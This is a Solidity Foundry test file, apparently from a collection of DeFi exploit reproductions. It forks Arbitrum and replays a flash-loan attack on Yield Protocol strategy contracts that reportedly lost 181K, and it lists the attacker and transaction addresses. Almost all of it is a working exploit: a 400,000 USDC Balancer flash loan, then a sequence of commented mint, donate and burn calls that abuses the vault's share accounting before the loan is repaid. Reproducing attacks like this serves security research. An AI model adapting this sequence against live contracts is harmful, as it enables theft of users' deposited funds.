// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "src/test/interface.sol";

// @KeyInfo - Total Lost : 181K
// Attacker : https://arbiscan.io/address/0x1abe06f451e2d569b3e9123baf33b51f68878656
// Attack Contract : https://arbiscan.io/address/0xd775fd7b76424a553e4adce6c2f99be419ce8d41
// Vulnerable Contract : https://arbiscan.io/address/0x3b4ffd93ce5fcf97e61aa8275ec241c76cc01a47
// Attack Tx : https://arbiscan.io/tx/0x6caa65b3fc5c8d4c7104574c3a15cd6208f742f9ada7d81ba027b20473137705

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x3b4ffd93ce5fcf97e61aa8275ec241c76cc01a47#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God : https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50

interface IYieldStrategy is IERC20 {
    function mint(address to) external returns (uint256);

    function burn(address to) external returns (uint256);

    function mintDivested(address to) external returns (uint256);

    function burnDivested(address to) external returns (uint256);
}

contract Yield is Test {
    uint256 blocknumToForkFrom = 206_219_811;
    IYieldStrategy YieldStrategy_1 = IYieldStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa); // pool token
    IYieldStrategy YieldStrategy_2 = IYieldStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47); // strategy token valut
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        vm.label(address(YieldStrategy_1), "YieldStrategy_1");
        vm.label(address(YieldStrategy_2), "YieldStrategy_2");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        // Implement exploit code here
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 400_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        // Log balances after exploit
        emit log_named_decimal_uint(
            " Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        bytes calldata userData
    ) external {
        USDC.transfer(address(YieldStrategy_1), 308_000 * 1e6);
        YieldStrategy_1.mintDivested(address(this)); // mint pool token with USDC

        uint256 transferAmount = YieldStrategy_1.balanceOf(address(this)) / 2;
        YieldStrategy_1.transfer(address(YieldStrategy_2), transferAmount);
        YieldStrategy_2.mint(address(YieldStrategy_2)); // mint strategy token

        YieldStrategy_1.transfer(address(YieldStrategy_2), YieldStrategy_1.balanceOf(address(this))); // donate pool token to strategy token vault
        YieldStrategy_2.burn(address(this)); // burn strategy token to get pool token

        YieldStrategy_2.mint(address(YieldStrategy_2)); // recover donated pool token
        YieldStrategy_2.burn(address(this));

        YieldStrategy_1.transfer(address(YieldStrategy_1), YieldStrategy_1.balanceOf(address(this)));
        YieldStrategy_1.burnDivested(address(this)); // burn pool token to USDC

        USDC.transfer(address(Balancer), amounts[0]);
    }
}
